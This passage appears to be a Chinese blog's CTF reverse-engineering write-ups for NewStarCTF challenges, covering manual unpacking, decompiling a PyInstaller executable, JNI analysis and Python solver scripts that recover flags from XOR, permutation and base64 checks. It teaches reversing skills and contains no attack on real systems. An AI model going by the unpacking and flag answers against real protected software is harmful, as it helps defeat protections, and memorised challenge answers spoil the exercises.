class="hljs-built_in">ascii</span> &lt;&lt; <span class="hljs-number">8</span>*(<span class="hljs-number">4</span>-j-<span class="hljs-number">1</span>))<br>        flag[i+(<span class="hljs-number">4</span>-j-<span class="hljs-number">1</span>)] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))<br></code></pre></td></tr></table></figure><h1 id="petals"><a class="markdownIt-Anchor" href="#petals"></a> Petals</h1><h2 id="分析-3"><a class="markdownIt-Anchor" href="#分析-3"></a> 分析</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291149363.png" alt="202211172010055" /></p><p>找到main函数，观察<code>loc_1209</code>是指令，可能反编译有问题，点击进去看看</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291149708.png" alt="202211172012817" /></p><p>在下面找到一个错误的提示，按D转换成原始数据形式</p><p>对E8使用Patcher直接nop掉，之后按c转换为代码，同时将此指令<code>loc_1209</code>按P转换为函数，之后就转换成函数</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291149728.png" alt="202211172017531" /></p><p>而<code>sub_160C</code>是一个比较函数，若是输入的值与最后存储的值相同，那么就是输入对了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">char</span>* input, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+1Ch] [rbp-114h]</span><br>__int64 v5[<span class="hljs-number">33</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br><span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br><span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i)<br>*((BYTE*)v5 + i) = ~(i ^ len);<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; len &gt; j; ++j)<br>input[j] = *((BYTE*)v5 + (<span class="hljs-type">unsigned</span> __int8)input[j]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-type">char</span> enc[] =<br>&#123;<br>  <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x89</span>,<br>  <span class="hljs-number">0x92</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD1</span>,<br>  <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x87</span>,<span class="hljs-number">0</span><br>&#125;;<br><span class="hljs-type">char</span> flag[<span class="hljs-number">56</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">25</span>; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; j++) &#123;<br>flag[i] = j;<br><span class="hljs-built_in">func</span>(flag, <span class="hljs-number">25</span>);<br><span class="hljs-keyword">if</span> (flag[i] == enc[i]) &#123;<br>cout &lt;&lt; (<span class="hljs-type">char</span>)j;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 66ccff#luotianyi#b074d58a</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="likemyasp"><a class="markdownIt-Anchor" href="#likemyasp"></a> Likemyasp</h1><h2 id="脱壳"><a class="markdownIt-Anchor" href="#脱壳"></a> 脱壳</h2><ul><li><p>有壳</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304230926089.png" alt="image-20230423092643020" /></p></li><li><p>upx尝试了脱不了，试试手动脱壳</p></li></ul><p>​直接在 x64dbg中脱壳，首先加载后按 F9 来到了加壳之后的 OEP处 (这里的 EP 是加壳后的EP，我们需要找到加壳前的 EP)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304230931775.png" alt="image-20230423093143699" /></p><p>​之后 <code>Ctrl + n</code> 在 <code>VirtualProtect</code> 处右键/F2下断点。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304230944510.png" alt="image-20230423094446475" /></p><p>​然后 <code>F9</code> 执行，发现总共会命中两次，在第二次命中的时候按 <code>ALT + F9</code> 退出此函数体</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304230947235.png" alt="image-20230423094701172" /></p><p>​之后一直 <code>F8</code> 单步调试，直到走不动了，这个就是等待IO操作的时候，可以重新调试发现 <code>main</code> 函数的地方就是在这个函数中</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304230950356.png" alt="image-20230423095011293" /></p><p>​再次观察可以发现前面两个是传参的地方，之后<code>F7</code> 步进函数内，发现有显示的文字，那么大概可以判断这里就是脱壳后的程序了，然后用 <code>Scylla</code> dump 并修复</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304230951176.png" alt="image-20230423095148133" /></p><ul><li>之后就可以看出来函数的逻辑了</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304230954433.png" alt="image-20230423095435400" /></p><h2 id="动调"><a class="markdownIt-Anchor" href="#动调"></a> 动调</h2><ul><li>不脱壳，直接动调。在最多逻辑的函数(猜测这是加密过程)中对最后下断点进行动调</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304231029385.png" alt="image-20230423102904343" /></p><ul><li><code>F8</code> 进行步过，然后一直走到卡住的地方(等待IO输入)，然后进入函数体就可以发现主函数逻辑了</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304231027691.png" alt="image-20230423102747612" /></p><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">chipher = [<span class="hljs-number">0xD803C1FC098</span>, <span class="hljs-number">0xE20360BC097</span>, <span class="hljs-number">0xFE02A1C00A0</span>, <span class="hljs-number">0xFA0121040CB</span>, <span class="hljs-number">0xF2032104092</span>, <span class="hljs-number">0xD6015884082</span>]<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(chipher)):<br>    flag += <span class="hljs-built_in">chr</span>(chipher[i] &gt;&gt; <span class="hljs-number">37</span> &amp; <span class="hljs-number">0xff</span> ^ <span class="hljs-number">0xa</span>)<br>    flag += <span class="hljs-built_in">chr</span>(chipher[i] &gt;&gt; <span class="hljs-number">23</span> &amp; <span class="hljs-number">0xff</span> ^ <span class="hljs-number">0x14</span>)<br>    flag += <span class="hljs-built_in">chr</span>(chipher[i] &gt;&gt; <span class="hljs-number">14</span> &amp; <span class="hljs-number">0xff</span> ^ <span class="hljs-number">0x1e</span>)<br>    flag += <span class="hljs-built_in">chr</span>(~(chipher[i])&amp; <span class="hljs-number">0xff</span>)<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h1 id="ur_so_native"><a class="markdownIt-Anchor" href="#ur_so_native"></a> ur_so_native</h1><h2 id="分析-4"><a class="markdownIt-Anchor" href="#分析-4"></a> 分析</h2><ul><li>一个apk文件，直接在jadx中分析，去到<code>com.new_star_ctf.u_navie/MainActivity</code>查看程序的逻辑<ul><li>之后发现加密函数 <code>encry</code> ,它的前面有个 <code>native</code> 的关键字，代表函数在 <code>native</code> 层实现。而native层实现的函数保存在 <code>.so</code> 文件中， <code>.so</code> 文件位于apk文件解压后<code>\lib</code> 层下</li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304231039751.png" alt="image-20230423103941691" /></p><ul><li>將 <code>libencry.so</code> 拉入IDA，找到 <code>encry</code> 函数，会发现一堆奇怪的东西。这是一种名为 <code>JNI</code> 的东西导致 IDA分析错误 <a href="https://zh.wikipedia.org/zh-cn/Java%E6%9C%AC%E5%9C%B0%E6%8E%A5%E5%8F%A3">什么是JNI</a></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304231040054.png" alt="image-20230423104049001" /></p><ul><li>之后对应 <code>JNI</code> 函数原型，手动修改 <code>entry</code> 函数的参数类型(按<code>y</code>)</li><li><a href="https://blog.csdn.net/yb493071294/article/details/80378730">还原 JNI 函数名</a></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304231111060.png" alt="image-20230423111118023" /></p><p>这里查看加密很奇怪，就附上别人的链接(懒得写了)</p><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/16759891.html">NewStartCTF</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【NewStartCTF】Reverse_Week1</title>
    <link href="/posts/b6040276.html"/>
    <url>/posts/b6040276.html</url>
    
    <content type="html"><![CDATA[<h1 id="hello_reversing"><a class="markdownIt-Anchor" href="#hello_reversing"></a> Hello_Reversing</h1><h2 id="查壳"><a class="markdownIt-Anchor" href="#查壳"></a> 查壳</h2><ul><li>首先使用exeinfope查一下壳<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291142134.png" alt="202210282330917" /></li><li>由图所示，此程序是64位程序，没有壳(Not packed)</li></ul><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><ul><li>使用ida打开程序，找到主函数(main)界面，按<span class="label label-info">Tab/F5</span>进入伪代码界面.<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291142425.png" alt="202210282333815" /></li><li>观察伪代码的信息，看到有&quot;3vers1ng_w0rld}&quot;，猜测此为flag的一半，另外一半可能也是这样的展示方式，则使用Shift+F12直接搜索程序中的字符串.<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291142526.png" alt="202210282337023" /></li><li>最后发现字符串的另一半在<a href="https://www.cnblogs.com/lsgxeva/p/8947829.html">.rdata</a>段中<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291142422.png" alt="202210290824478" /></li><li>找到了flag的前半部分，点击进入汇编界面。在相应显示flag前半段的位置处，直接按Shift+e进行提取，那么就得到了flag.</li></ul><h1 id="pyre"><a class="markdownIt-Anchor" href="#pyre"></a> Pyre</h1><h2 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h2><ul><li><p>得到文件pyre.exe，由文件名字可以看出这个是由py文件编译成的exe文件，则使用<a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor.py</a>可以将pyre进行反编译</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> pyinstxtractor.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;filename&gt;</span><br></code></pre></td></tr></table></figure><p>运行成功<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143942.png" alt="202210290851753" /></p></li><li><p>反编译后，会生成一个文件夹,其中的.pyc文件就是由.exe反编译得到的，现在需要将.pyc反编译成.py文件<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143490.png" alt="202210290854071" /></p></li></ul><h2 id="反编译"><a class="markdownIt-Anchor" href="#反编译"></a> 反编译</h2><ol><li><p>直接使用<a href="https://tool.lu/pyc/">在线网站</a>进行反编译</p></li><li><p>使用<a href="https://github.com/rocky/python-uncompyle6">uncompyle6</a>进行反编译</p></li></ol><ul><li>uncompyle6可将python字节码转换回等效的python源代码，它接受python 1.3版到3.8版的字节码</li><li>安装</li></ul>  <figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> uncompyle6<br></code></pre></td></tr></table></figure><ul><li>使用示例</li></ul>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">uncompyle6 -<span class="hljs-keyword">o</span> fliename.<span class="hljs-keyword">py</span> <span class="hljs-keyword">file</span>.pyc #  对filename.pyc文件进行反编译，输出为<span class="hljs-keyword">file</span>.<span class="hljs-keyword">py</span>文件<br></code></pre></td></tr></table></figure><h2 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h2><ul><li><p>查看反编译后的.py源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-string">&#x27;&#x27;</span><br>encode = <span class="hljs-string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span><br>table = [<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">13</span>, <span class="hljs-number">16</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <br>        <span class="hljs-number">22</span>, <span class="hljs-number">19</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">18</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">17</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params"><span class="hljs-built_in">input</span></span>):<br>    tmp = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>)):<br>        tmp += <span class="hljs-built_in">input</span>[table[i]]<br><br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Please input your flag:&#x27;</span>)<br>    flag = <span class="hljs-built_in">input</span>()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) != <span class="hljs-number">23</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Length Wrong!!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        final = enc(flag)<br>        <span class="hljs-keyword">if</span> final == encode:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wow,you get the right flag!!&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Sorry,Your input is Wrong&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p>此加密为将flag打乱顺序，将table的值作为下标进行输出，则可以构造和encode等长的列表，进行逆操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">encode = <span class="hljs-string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span><br>table = [<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">13</span>, <span class="hljs-number">16</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <br>        <span class="hljs-number">22</span>, <span class="hljs-number">19</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">18</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">17</span>]<br><br>flag = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encode))]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encode)):<br>    flag[table[i]] = encode[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))<br></code></pre></td></tr></table></figure></li></ul><h1 id="baby_re"><a class="markdownIt-Anchor" href="#baby_re"></a> Baby_Re</h1><h2 id="分析-3"><a class="markdownIt-Anchor" href="#分析-3"></a> 分析</h2><ul><li><p>64位程序.使用ida打开程序，找到主函数(main)界面，按<span class="label label-info">Tab/F5</span>进入伪代码界面.<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143901.png" alt="202210291704483" /></p><p>由main函数界面，可以看出此题是输入一个字符串，先进行与i异或，之后经过compare函数，正确返回为1</p></li><li><p>跟进compare函数，发现是用final与s进行比较<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143700.png" alt="202210291708684" /><br />可以知道flag(输入的字符串)为32位长，然后遍历输入的字符串，要求和final一样,跟进final，</p></li><li><p>按Shift+e提取数据<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143724.png" alt="202210291712101" /></p></li></ul><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">final = [<span class="hljs-number">102</span>, <span class="hljs-number">109</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">127</span>,  <span class="hljs-number">86</span>, <span class="hljs-number">105</span>, <span class="hljs-number">106</span>, <span class="hljs-number">109</span>, <span class="hljs-number">125</span>,<br>  <span class="hljs-number">98</span>, <span class="hljs-number">98</span>,  <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">81</span>, <span class="hljs-number">125</span>, <span class="hljs-number">101</span>, <span class="hljs-number">127</span>, <span class="hljs-number">77</span>, <span class="hljs-number">113</span>, <span class="hljs-number">113</span>, <span class="hljs-number">115</span>, <br>  <span class="hljs-number">121</span>, <span class="hljs-number">101</span>, <span class="hljs-number">125</span>, <span class="hljs-number">70</span>, <span class="hljs-number">119</span>, <span class="hljs-number">122</span>, <span class="hljs-number">117</span>, <span class="hljs-number">115</span>, <span class="hljs-number">33</span>, <span class="hljs-number">98</span>]<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(final)):<br>    flag += <span class="hljs-built_in">chr</span>(final[i]^i)<br>    <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><ul><li>运行出来的flag为flag{Something_run_before_main?}</li><li>提交发现这个flag是一个假的，之后根据题意与线索，发现有4个bytes不一样<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143889.png" alt="202210291724280" /></li><li>跟进function进行查看<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143970.png" alt="202210291726414" /><br />发现对于这四个位置进行了修改，之后更改exp,修改这4个位置的数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">final = [<span class="hljs-number">102</span>, <span class="hljs-number">109</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">127</span>, <span class="hljs-number">86</span>, <span class="hljs-number">54</span>, <span class="hljs-number">106</span>, <span class="hljs-number">109</span>, <span class="hljs-number">125</span>, <br>  <span class="hljs-number">58</span>, <span class="hljs-number">98</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">81</span>, <span class="hljs-number">125</span>, <span class="hljs-number">101</span>, <span class="hljs-number">127</span>,  <span class="hljs-number">77</span>, <span class="hljs-number">113</span>, <span class="hljs-number">113</span>, <span class="hljs-number">115</span>, <br>  <span class="hljs-number">38</span>, <span class="hljs-number">101</span>, <span class="hljs-number">125</span>, <span class="hljs-number">70</span>, <span class="hljs-number">119</span>, <span class="hljs-number">122</span>, <span class="hljs-number">117</span>, <span class="hljs-number">115</span>, <span class="hljs-number">63</span>, <span class="hljs-number">98</span>]<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(final)):<br>    flag += <span class="hljs-built_in">chr</span>(final[i]^i)<br>    <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="easyre"><a class="markdownIt-Anchor" href="#easyre"></a> EasyRe</h1><h2 id="分析-4"><a class="markdownIt-Anchor" href="#分析-4"></a> 分析</h2><ul><li>题目为.exe文件和.dll文件.对.exe查壳,无壳,64位,在ida中查看.<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291143629.png" alt="202210291954295" /><br />首先exe会加载dll，调用dll里的函数，图中的红框.同时这里的57行将ProcAddress定义为enc.dll中的encode函数<br />之后就是将输入的字符串经过encode后与Str2进行比较，相等则得到flag</li><li>继续分析enc.dll<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291144593.png" alt="202210292004505" /><br />跟进return进行查看<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291145266.png" alt="202210292004268" /><br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291146960.png" alt="202210292005284" /><br />则enc.dll大致是将输入的字符串a1进行一个加密操作之后赋值给a2，之后a2与Str(Reverse)进行异或输出a2</li><li>enc.dll的加密操作复杂，使用Shift+F12查看有没有可以使用的信息<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291146739.png" alt="202210292009641" /><br />看到一串字符，判定为base64编码，即加密就是base加密</li></ul><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h2><ul><li>这里final[14]题目中没有告知,先当0进行处理,成功获得flag;若是不能，可以爆破final[14],对其遍历所有ascii爆破最后的flag.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>final = [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">14</span>, <span class="hljs-number">13</span>, <span class="hljs-number">40</span>, <span class="hljs-number">64</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">60</span>, <span class="hljs-number">46</span>, <span class="hljs-number">43</span>, <span class="hljs-number">30</span>, <span class="hljs-number">61</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>,<br>        <span class="hljs-number">59</span>, <span class="hljs-number">61</span>, <span class="hljs-number">60</span>, <span class="hljs-number">21</span>, <span class="hljs-number">40</span>, <span class="hljs-number">5</span>, <span class="hljs-number">80</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">42</span>, <span class="hljs-number">57</span>, <span class="hljs-number">9</span>, <span class="hljs-number">49</span>, <span class="hljs-number">86</span>, <span class="hljs-number">36</span>, <span class="hljs-number">28</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;?$P&lt;,%#K&#x27;</span>:<br>    final.append(<span class="hljs-built_in">ord</span>(i))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;Reverse&#x27;</span><br><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(final)):<br>    flag.append(<span class="hljs-built_in">chr</span>(final[i] ^ <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i % <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)])))<br><br>content = base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(flag).encode())<br><span class="hljs-built_in">print</span>(content)<br></code></pre></td></tr></table></figure><h1 id="艾克体悟题"><a class="markdownIt-Anchor" href="#艾克体悟题"></a> 艾克体悟题</h1><p>作者给了提示：<a href="https://note.youdao.com/ynoteshare/index.html?id=a006b246edc7fc65ed20abbc2d9c5351&amp;type=note&amp;%5C_time=1663716620460">点击这里</a></p><h2 id="分析-5"><a class="markdownIt-Anchor" href="#分析-5"></a> 分析</h2><ul><li>有题目可以得知，在模拟器中直接打开apk文件<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291146756.png" alt="202211072352571" /></li><li>则使用<span class="label label-info">adb shell</span>启动指定的Activity</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span>   进入<span class="hljs-keyword">shell</span><br><span class="hljs-keyword">am</span> start -n <span class="hljs-keyword">com</span>.droidlearn.activity_travel/.FlagActivity   按上述地址路径，打开指定控件<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291146943.png" alt="202211072353036" /></p><h2 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4"></a> exp</h2><ol><li>使用python中的 pyautogui 库控制鼠标自动进行连点操作</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 